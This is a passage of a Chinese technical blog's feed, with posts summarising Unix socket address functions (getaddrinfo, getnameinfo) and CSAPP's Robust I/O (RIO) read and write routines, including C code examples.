class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功返回0，若出错返回非零错误码 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getaddrinfo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">restrict</span> host,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">restrict</span> service,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">const</span> struct addrinfo *<span class="keyword">restrict</span> hint,</span></span></span><br><span class="line"><span class="function"><span class="params">                strcut addrinfo **<span class="keyword">restrict</span> res)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：无 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeaddrinfo</span><span class="params">(struct addrinfo *ai)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：错误消息字符串 */</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">gai_strerror</span><span class="params">(<span class="keyword">int</span> errcode)</span></span>;</span><br></pre></td></tr></table></figure><p><code>host</code>参数指定主机地址，可以是域名或者点分十进制的IP地址。<code>service</code>参数可以是服务名也可以是十进制的端口号。主机名和服务名可以两者都提供，也可以只提供一个，但另一个必须是一个空指针。</p><p><code>getaddrinfo</code>函数返回一个链表结构<code>addrinfo</code>，<code>res</code>指向该结构的第一个节点。使用<code>freeaddrinfo</code>函数可以释放该结构。<code>addrinfo</code>结构的定义至少包含以下成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>             ai_flags;       <span class="comment">/* customize behavior */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_family;      <span class="comment">/* address family，first arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_socktype;    <span class="comment">/* socket type，second arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_protocol;    <span class="comment">/* protocol，third arg to socket function */</span></span><br><span class="line">    <span class="keyword">char</span>            *ai_canonname;  <span class="comment">/* canonical name for hostname */</span></span><br><span class="line">    <span class="keyword">socklen_t</span>       ai_addrlen;     <span class="comment">/* length in byte of address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">ai_addr</span>;</span>       <span class="comment">/* address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">ai_next</span>;</span>       <span class="comment">/* next in list */</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>getaddrinfo</code>可以指定一个可选的<code>hint</code>来过滤符合条件的地址，包括<code>ai_family</code>、<code>ai_flags</code>、<code>ai_protocol</code>、<code>ai_socktype</code>字段。剩余的字段必须置为0或空指针。</p><p>下表总结了<code>ai_flags</code>字段的标志，这些标志可以通过or运算指定多个：</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>AI_ADDRCONFIG</td><td>查询配置的地址类型（IPv4或IPv6）。使用连接时推荐。只有当本地主机被配置为IPv4时，<code>getaddrinfo</code>返回IPv4地址。对IPv6同样</td></tr><tr><td>AI_ALL</td><td>查找IPv4和IPv6地址（仅用于AI_V4MAPPED）</td></tr><tr><td>AI_CANONNAME</td><td>需要一个规范的名字（与别名相对）</td></tr><tr><td>AI_NUMERICHOST</td><td>以数字格式指定主机地址</td></tr><tr><td>AI_NUMERICSERV</td><td>将服务指定为数字端口号</td></tr><tr><td>AI_PASSIVE</td><td>套接字地址用于监听绑定</td></tr><tr><td>AI_V4MAPPED</td><td>如果没有找到IPv6地址，返回映射到IPv6格式的IPv4地址</td></tr></tbody></table><p>如果<code>getaddrinfo</code>出错，可以将返回的错误码传入<code>gai_strerror</code>函数获取具体的错误信息。</p><p>接下来的<code>getnameinfo</code>函数与<code>getaddrinfo</code>函数功能相反，用于将一个地址转化为一个主机名和一个服务名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功返回0，出错返回非0值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getnameinfo</span><span class="params">(<span class="keyword">const</span> struct sockaddr *<span class="keyword">restrict</span> addr, <span class="keyword">socklen_t</span> alen,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> *<span class="keyword">restrict</span> host, <span class="keyword">socklen_t</span> hostlen,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> *<span class="keyword">restrict</span> service, <span class="keyword">socklen_t</span> servlen,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p><code>getnameinfo</code>将字节长度为<code>alen</code>的套接字地址<code>addr</code>翻译成一个主机名和一个服务名，如果<code>host</code>非空，则指向一个字节长度为<code>hostlen</code>的缓冲区用于存放主机名。同样的，如果<code>service</code>非空，则指向一个长度为<code>servlen</code>的缓冲区来存放服务名。<code>flags</code>参数指定了函数工作的方式，如下：</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>NI_DGRAM</td><td>服务基于数据报而非基于流</td></tr><tr><td>NI_NAMEREQD</td><td>如果找不到主机名，将其作为一个错误对待</td></tr><tr><td>NI_NOFQDN</td><td>对于本地主机，仅返回全限定域名的节点名部分</td></tr><tr><td>NI_NUMERICHOST</td><td>函数默认返回host中的域名，该标志指定返回主机的数字形式，而非主机名</td></tr><tr><td>NI_NUMERICSCOPE</td><td>对于IPv6，返回范围ID的数字形式，而非名字</td></tr><tr><td>NI_NUMERICSERV</td><td>函数默认检查/etc/services，如果可能会返回服务名而不是端口号。该标志指定跳过检查，返回服务地址的数字形式（端口号），而非名字</td></tr></tbody></table><p>下面一个来自书中的例子展示域名到它IP地址的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* main.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 8192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">p</span>, *<span class="title">listp</span>, <span class="title">hints</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLEN], buf1[MAXLEN];</span><br><span class="line">    <span class="keyword">int</span> rc, flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"argv error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct addrinfo));</span><br><span class="line">    hints.ai_family = AF_INET;</span><br><span class="line">    hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">    <span class="keyword">if</span>((rc = getaddrinfo(argv[<span class="number">1</span>], <span class="literal">NULL</span>, &amp;hints, &amp;listp)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"getaddrinfo error: %s\n"</span>, gai_strerror(rc));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flags = NI_NUMERICHOST;</span><br><span class="line">    <span class="keyword">for</span>(p = listp; p; p = p-&gt;ai_next) &#123;</span><br><span class="line">        getnameinfo(p-&gt;ai_addr, p-&gt;ai_addrlen, buf, MAXLEN, buf1, MAXLEN, flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s %s\n"</span>, buf, buf1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    freeaddrinfo(listp);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.c -o main</span><br><span class="line">$ ./main baidu.com</span><br><span class="line"><span class="number">39.156</span><span class="number">.69</span><span class="number">.79</span> <span class="number">0</span></span><br><span class="line"><span class="number">220.181</span><span class="number">.38</span><span class="number">.148</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>unix提供了一组函数用于创建套接字并完成数据传输：</p><ul><li>使用<code>getaddrinfo</code>函数和<code>socket</code>函数来创建套接字，可以使程序更具有通用性。</li><li>服务端使用<code>bind</code>给套接字绑定地址，使用<code>listen</code>指定套接字用于监听，并使用<code>accept</code>接受连接</li><li>客户端使用<code>connect</code>来连接到服务器</li><li>客户端和服务端都可以使用<code>send</code>和<code>recv</code>来传递数据</li><li>使用<code>close</code>或<code>shutdown</code>函数来关闭套接字</li></ul><hr><p>总结自《深入理解计算机系统》《Unix环境高级编程》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;套接字是操作系统中用于网络通信的重要结构，它是建立在网络体系结构的传输层，用于主机之间数据的发送和接收，像web中使用的http协议便是建立
      
    
    </summary>
    
      <category term="Linux" scheme="https://mingliangliu.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>健壮的I/O(RIO)</title>
    <link href="https://mingliangliu.com/posts/8fd6efd8/"/>
    <id>https://mingliangliu.com/posts/8fd6efd8/</id>
    <published>2019-10-19T03:52:47.000Z</published>
    <updated>2020-02-15T06:45:50.780Z</updated>
    
    <content type="html"><![CDATA[<p>在上篇<a href="./Unix系统级I-O.md">Unix系统级I/O</a>中，我们介绍了有关在Unix环境下读取和写入文件的函数<code>read</code>和<code>write</code>，也提到了标准I/O在进行网络I/O时的局限性。但是在某些地方，直接使用<code>read</code>和<code>write</code>往往会出现不足值，比如在复杂的网络环境中读取socket。如果想让我们的程序更加的可靠，就需要反复的调用<code>read</code>和<code>write</code>去处理，知道传送完所需要的字节。在csapp一书中，给我们提供了一个健壮可靠的I/O包来自动处理这种不足值的情况，称为RIO（Robust I/O）。本文主要整理RIO提供的函数备忘。</p><p>详细代码及用法示例可以在<a href="https://github.com/Varpc/misc/tree/master/rio" target="_blank" rel="noopener">这里</a>找到。</p><h2 id="无缓冲区的rio"><a href="#无缓冲区的rio" class="headerlink" title="无缓冲区的rio"></a>无缓冲区的rio</h2><p><code>rio_readn</code>、<code>rio_writen</code>和<code>read</code>、<code>write</code>用法基本一致，只是<code>rio_readn</code>会不断尝试读出，直到读取出n个字节或遇到EOF或出错；<code>rio_writen</code>函数绝不会返回一个不足值，它会不断尝试写入直到写入全部字节或者出错。由于没有缓冲区的存在，<code>rio_readn</code>和<code>rio_writen</code>可以任意交替使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"rio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span>  rio_readn(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n);</span><br><span class="line"><span class="comment">/* 返回：若成功则为传送的字节数，若为EOF则为0，若出错则为-1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span>  rio_writen(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n);</span><br><span class="line"><span class="comment">/* 返回：若成功则为传送的字节数，若出错则为-1 */</span></span><br></pre></td></tr></table></figure><p>函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> rio_readn(<span class="keyword">int</span> fd, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> nleft = n;</span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line">    <span class="keyword">char</span> *bufp = usrbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((nread = read(fd, bufp, nleft)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(errno == EINTR)      <span class="comment">/* Interrupted by big handler return */</span></span><br><span class="line">                nread = <span class="number">0</span>;          <span class="comment">/* and call read() again */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;          <span class="comment">/* errno set by read() */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;                  <span class="comment">/* EOF */</span></span><br><span class="line">        nleft -= nread;</span><br><span class="line">        bufp += nread;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (n - nleft);             <span class="comment">/* return &gt;= 0 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> rio_writen(<span class="keyword">int</span> fd, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> nleft = n;</span><br><span class="line">    <span class="keyword">ssize_t</span> nwritten;</span><br><span class="line">    <span class="keyword">char</span> *bufp = usrbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((nwritten = write(fd, bufp, nleft)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(errno == EINTR)      <span class="comment">/* Interrupted by big handler return */</span></span><br><span class="line">                nwritten = <span class="number">0</span>;       <span class="comment">/* and call write() again */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;          <span class="comment">/* errno set by write() */</span></span><br><span class="line">        &#125;</span><br><span class="line">        nleft -= nwritten;</span><br><span class="line">        bufp += nwritten;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="带缓冲区的rio"><a href="#带缓冲区的rio" class="headerlink" title="带缓冲区的rio"></a>带缓冲区的rio</h2><p>带缓冲区的rio所包含的函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"rio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rio_readinitb</span><span class="params">(<span class="keyword">rio_t</span> *rp, <span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：无 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> rio_readlineb(<span class="keyword">rio_t</span> *rp, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> maxlen);</span><br><span class="line"><span class="keyword">ssize_t</span> rio_readnb(<span class="keyword">rio_t</span> *rp, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> n);</span><br><span class="line"><span class="comment">/* 返回：若成功则为读的字节数，若为EOF则为0，若出错则为-1 */</span></span><br></pre></td></tr></table></figure><p>带缓冲区的rio由一个<code>rio_t</code>的结构体管理，其形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIO_BUFSIZE 8192</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>     rio_fd;                 <span class="comment">/* 描述符 */</span></span><br><span class="line">    <span class="keyword">int</span>     rio_cnt;                <span class="comment">/* 缓冲区中还未读的字节数 */</span></span><br><span class="line">    <span class="keyword">char</span>    *rio_bufptr;            <span class="comment">/* 缓冲区中下一个未读的字节 */</span></span><br><span class="line">    <span class="keyword">char</span>    rio_buf[RIO_BUFSIZE];   <span class="comment">/* 缓冲区 */</span></span><br><span class="line">&#125; <span class="keyword">rio_t</span>;</span><br></pre></td></tr></table></figure><p>在使用带缓冲区的rio时，每打开一个描述符，都需要使用<code>rio_readinitb</code>来对<code>rio_t</code>进行初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rio_readinitb</span><span class="params">(<span class="keyword">rio_t</span> *rp, <span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    rp-&gt;rio_fd = fd;</span><br><span class="line">    rp-&gt;rio_cnt = <span class="number">0</span>;</span><br><span class="line">    rp-&gt;rio_bufptr = rp-&gt;rio_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对缓冲区的控制主要由<code>rio_read</code>来完成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">rio_read</span><span class="params">(<span class="keyword">rio_t</span> *rp, <span class="keyword">char</span> *usrbuf, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rp-&gt;rio_cnt &lt;= <span class="number">0</span>) &#123;  <span class="comment">/* Refill if buf is empty */</span></span><br><span class="line">        rp-&gt;rio_cnt = read(rp-&gt;rio_fd, rp-&gt;rio_buf, <span class="keyword">sizeof</span>(rp-&gt;rio_buf));</span><br><span class="line">        <span class="keyword">if</span> (rp-&gt;rio_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno != EINTR) <span class="comment">/* Interrupted by sig handler return */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rp-&gt;rio_cnt == <span class="number">0</span>)  <span class="comment">/* EOF */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            rp-&gt;rio_bufptr = rp-&gt;rio_buf; <span class="comment">/* Reset buffer ptr */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy min(n, rp-&gt;rio_cnt) bytes from internal buf to user buf */</span></span><br><span class="line">    cnt = n;</span><br><span class="line">    <span class="keyword">if</span> (rp-&gt;rio_cnt &lt; n)</span><br><span class="line">        cnt = rp-&gt;rio_cnt;</span><br><span class="line">    <span class="built_in">memcpy</span>(usrbuf, rp-&gt;rio_bufptr, cnt);</span><br><span class="line">    rp-&gt;rio_bufptr += cnt;</span><br><span class="line">    rp-&gt;rio_cnt -= cnt;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>rio_read</code>函数由<code>static</code>关键字修饰成静态函数，这对与一个函数来说，说明这个函数只对声明它的文件可见，且不同的文件可以声明相同名的静态函数。</p></blockquote><p><code>rio_readlineb</code>和<code>rio_readnb</code>的具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> rio_readnb(<span class="keyword">rio_t</span> *rp, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> n) &#123;</span><br><span class="line">    <span class="keyword">size_t</span> nleft = n;</span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line">    <span class="keyword">char</span> *bufp = usrbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((nread = rio_read(rp, bufp, nleft)) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;          <span class="comment">/* errno set by read() */</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;              <span class="comment">/* EOF */</span></span><br><span class="line">        nleft -= nread;</span><br><span class="line">        bufp += nread;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (n - nleft);         <span class="comment">/* return &gt;= 0 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> rio_readlineb(<span class="keyword">rio_t</span> *rp, <span class="keyword">void</span> *usrbuf, <span class="keyword">size_t</span> maxlen) &#123;</span><br><span class="line">    <span class="keyword">int</span> n, rc;</span><br><span class="line">    <span class="keyword">char</span> c, *bufp = usrbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; maxlen; n++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((rc = rio_read(rp, &amp;c, <span class="number">1</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">            *bufp++ = c;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">'\n'</span>) &#123;</span><br><span class="line">                n++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">/* EOF, no data read */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;      <span class="comment">/* EOF, some data was read */</span></span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;      <span class="comment">/* Error */</span></span><br><span class="line">    &#125;</span><br><span class="line">    *bufp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> n - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在上篇&lt;a href=&quot;./Unix系统级I-O.md&quot;&gt;Unix系统级I/O&lt;/a&gt;中，我们介绍了有关在Unix环境下读取和写入文件的函数&lt;code&gt;read&lt;/code&gt;和&lt;code&gt;write&lt;/code&gt;，也提到了标准I/O在进行网络I/O时的局限性。但是在某些地方
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Unix系统级I/O</title>
    <link href="https://mingliangliu.com/posts/790db60c/"/>
    <id>https://mingliangliu.com/posts/790db60c/</id>
    <published>2019-10-18T09:22:59.000Z</published>
    <updated>2020-02-15T06:45:50.769Z</updated>
    
